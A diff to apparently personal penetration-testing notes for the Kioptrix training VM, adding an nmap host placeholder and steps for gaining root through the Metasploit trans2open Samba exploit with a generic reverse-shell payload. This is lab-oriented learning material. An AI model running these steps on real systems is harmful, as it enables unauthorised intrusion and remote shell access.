@@ -31,7 +31,7 @@ find out the ip of the machine in the network
 
 *Specific Ports Scan*
 
-    sudo nmap -Pn -nvv -p 22,80,8080 --version intensity 9 -A -oN /home/kali/Desktop/kioptrix.txt
+    sudo nmap -Pn -nvv -p 22,80,8080 --version intensity 9 -A -oN /home/kali/Desktop/kioptrix.txt <host>
 
     -nvv 
     -Pn
@@ -94,6 +94,27 @@ search for an auxiliary scanner for smb with meatsploit
     smbclient -L <ip>
 
 SAMBA is a good source for exploits
+
+*Gaining Root with Metasploit*
+
+    msfconsole
+    search trans2open - use linux version
+    show targets - there can be a lot of them
+    show Options - to see the payload
+    
+If a static payload is set (to be seen by / in the path it can maybe not work).
+Solution is to replace that with a generic payload.
+
+Generic (non staged):
+
+    set payload generic/shell_reverse_tcp
+
+Staged:
+
+    set payload generic/shell/reverse_tcp
+    
+exploit maybe leads to success
+If it fails first try is the payload, then maybe it is the port. 
 
 **DNS Enumeration**
 
